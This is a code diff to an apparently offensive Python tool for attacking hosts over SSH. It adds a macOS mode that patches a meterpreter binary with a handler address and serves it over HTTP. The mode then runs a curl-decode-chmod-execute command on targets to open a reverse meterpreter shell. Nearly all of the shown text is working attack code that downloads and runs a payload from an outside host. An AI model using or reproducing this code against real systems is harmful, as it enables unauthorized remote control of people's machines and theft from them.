@@ -15,6 +15,7 @@ import urllib2
 import ssl
 import requests
 import os
+import random
 
 CRED = '\033[91m'
 CEND = '\033[0m'
@@ -221,6 +222,21 @@ def shellcode_meterpreter_64(port,ip):
     return shellcode
 
 
+def macho(lhost, lport, targets, port, username, password, m_ip, m_port):
+    with open('meterpreter_baseline', 'r') as file:
+        filedata = file.read()
+    filedata = filedata.replace('100.100.100.100:65535\"\x20', m_ip + ':' + m_port + '\"\x20' + (20 - len(m_ip+m_port)) * "\x00")
+    with open('output/meterpreter.txt', 'w') as file:
+        encoded = base64.b64encode(filedata)
+        file.write(encoded)
+    print CGREEN + "[!] Spinning up HTTP server..." + CEND
+    thread.start_new_thread(start_server, ('MyStringHere', int(lport)))
+    time.sleep(3)
+    command = "curl http://" + str(lhost) + ":" + str(lport) + "/output/meterpreter.txt | base64 -D > output; chmod +x output; sleep 1; rm output & ./output"
+    print CGREEN + "Attempting to execute MacOS x64 meterpreter... \nHandler: " + str(m_ip) + ":" + str(m_port) + " \nPayload: osx/x64/meterpreter_reverse_tcp" + CEND
+    execute_command(targets, port, username, password, command, 2)
+
+
 def invoke_shellcode(shellcode):
     the_code = '''
 #!/usr/bin/env python
@@ -279,6 +295,7 @@ def main():
     args = parser.parse_args()
     ip = args.first_arg[0]
     targets = parse_targets(ip)
+
     if args.command:
         print CGREEN + "[!] Running custom command " + "\"" + args.command + "\"..." + CEND
         execute_command(targets, 22, args.username, args.password, args.command, 100)
@@ -290,7 +307,7 @@ def main():
             lport = 8080
         else:
             try:
-                lport = options['LPORT']
+                lport = options['LISTEN']
             except KeyError:
                 print "Must supply an LHOST for use with mimipenguin"
                 exit()
@@ -325,6 +342,22 @@ def main():
             command = invoke_shellcode(shellcode_meterpreter_64(m_port, m_ip))
             print CGREEN + "Attempting to execute meterpreter shellcode... \nHandler: " + str(m_ip) + ":" + str(m_port) + " \nPayload: linux/x64/meterpreter/reverse_tcp" +  CEND
             execute_command(targets, 22, args.username, args.password, command, 1)
+        if type == 'osx':
+            try:
+                lport = options['LISTEN']
+            except:
+                lport = 8080
+            try:
+                m_ip = options['LHOST']
+            except KeyError:
+                print "Must supply an LHOST for use with meterpreter"
+                exit()
+            try:
+                m_port = options['LPORT']
+            except KeyError:
+                print "Must supply an LPORT for use with meterpreter"
+                exit()
+            macho(get_ip(), lport, targets, 22, args.username, args.password, m_ip, m_port)
 
 
 
